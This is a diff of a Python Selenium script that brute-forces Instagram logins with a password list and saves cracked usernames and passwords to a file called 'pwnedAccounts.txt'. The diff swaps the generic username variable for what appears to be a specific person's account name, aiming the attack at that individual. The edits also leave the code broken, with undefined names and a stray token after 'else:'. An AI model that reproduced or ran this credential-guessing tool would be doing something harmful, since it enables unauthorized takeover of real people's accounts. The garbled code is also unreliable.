@@ -12,12 +12,12 @@ profile = webdriver.FirefoxProfile()
 profile.set_preference("general.useragent.override", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36")
 driver = "reserved"
 
-def userExists(username):
+def userExists(marianaschiaffino):
 	try:
-		driver.get("https://instagram.com/"+username)
+		driver.get("https://instagram.com/"+marianaschiaffino)
 		assert (("Page Not Found" or "no encontrada") not in driver.title)
 	except AssertionError:
-		print 'user: "%s" does not exist, trying with the next!' %username
+		print 'marianaschiaffino: "%s" does not exist, trying with the next!' %marianaschiaffino
 		return 1
 	except:
 		'uknown error'
@@ -25,16 +25,16 @@ def userExists(username):
 def login(user, password, delay):
 	try:
 		print 'Trying with password: ' + password
-		elem = driver.find_element_by_name("username")
+		elem = driver.find_element_by_name("marianaschiaffino")
 		elem.clear()
-		elem.send_keys(user)
+		elem.send_keys(marianaschiaffino)
 		elem = driver.find_element_by_name("password")
 		elem.clear()
 		elem.send_keys(password)
 		elem.send_keys(Keys.RETURN)
 		sleep(delay)
 		assert (("Login") in driver.title)
-		#assert (("Your username or password was incorrect" or "son incorrectos.") not in driver.page_source)
+		#assert (("Your marianaschiaffino or password was incorrect" or "son incorrectos.") not in driver.page_source)
 		#if driver.current_url == 'https://www.instagram.com/':
 		#	print 'Password correct!'
 		#	print '%s' %password
@@ -47,7 +47,7 @@ def login(user, password, delay):
 			f = open('pwnedAccounts.txt','a')
 		except:
 			f = open('pwnedAccounts.txt','w')
-		f.write('username:'+user+'\npassword:'+password+'\n')
+		f.write('username:'+marianaschiaffino+'\npassword:'+password+'\n')
 		f.close()
 		driver.delete_all_cookies()
 		return 1
@@ -55,23 +55,23 @@ def login(user, password, delay):
 		print "\r Check your connection to the internet mother kaker\r"
 
 def dictionaryAttack(usernames,passwords,delay):
-	if str(type(usernames)) == "<type 'list'>":
+	if str(type(marianaschiaffino)) == "<type 'list'>":
 		for username in usernames:
-			if (userExists(username) == 1):
+			if (userExists(marianaschiaffino) == 1):
 				continue
 			driver.get("https://instagram.com/accounts/login/")
 			sleep(delay * 7)
-			print 'Trying with username: ' + username
+			print 'Trying with username: ' + marianaschiaffino 
 			for password in passwords:
 				if (login(username,password,delay) == 1):
 					cj.clear()
 					break
-	else:
-		if (userExists(usernames) == 1):
+	else: te 
+		if (userExists(marianaschiaffino) == 1):
 			return
 		driver.get("https://instagram.com/accounts/login/")
 		sleep(delay * 7)
-		print 'Trying with username: ' + usernames
+		print 'Trying with username: ' + marianaschiaffino 
 		for password in passwords:
 			if (login(usernames,password,delay) == 1):
 				break
